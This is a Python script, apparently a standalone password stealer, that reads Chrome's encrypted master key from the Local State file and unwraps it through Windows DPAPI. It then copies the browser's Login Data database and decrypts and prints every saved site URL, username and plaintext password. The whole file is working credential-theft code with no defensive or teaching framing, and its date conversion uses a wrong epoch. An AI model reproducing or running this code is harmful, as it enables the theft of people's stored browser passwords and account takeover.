from datetime import timezone, datetime, timedelta
import os
import json
from Crypto.Cipher import AES
import shutil
import base64
import sqlite3
import win32crypt

# need to down load -- pip3 install pycryptodome pypiwin32

#convert  chrome data  to be able to read
def getDateTime(date):
    return datetime(2019,1,1) +timedelta(microseconds= date)

#extracts and decodes the AES key
def getKey():
    path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(path, "r", encoding="utf-8") as f:
        localState = f.read()
        localState = json.loads(localState)

    #decode base 64
    key = base64.b64decode(localState["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]

    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def main():
    key = getKey()
    databasePath = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    
    File = "ChromeData.db"
    shutil.copyfile(databasePath, File)

    database = sqlite3.connect(File)
    cursor = database.cursor()

    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]        
            if username or password:
                print(f"Origin URL: {origin_url}")
                print(f"Action URL: {action_url}")
                print(f"Username: {username}")
                print(f"Password: {password}")
            else:
                continue
            if date_created != 86400000000 and date_created:
                print(f"Creation date: {str(getDateTime(date_created))}")
            if date_last_used != 86400000000 and date_last_used:
                print(f"Last Used: {str(getDateTime(date_last_used))}")
            print("="*50)
    cursor.close()
    database.close()
    try:
        os.remove(File)
    except:
        pass

if __name__ == "__main__":
    main()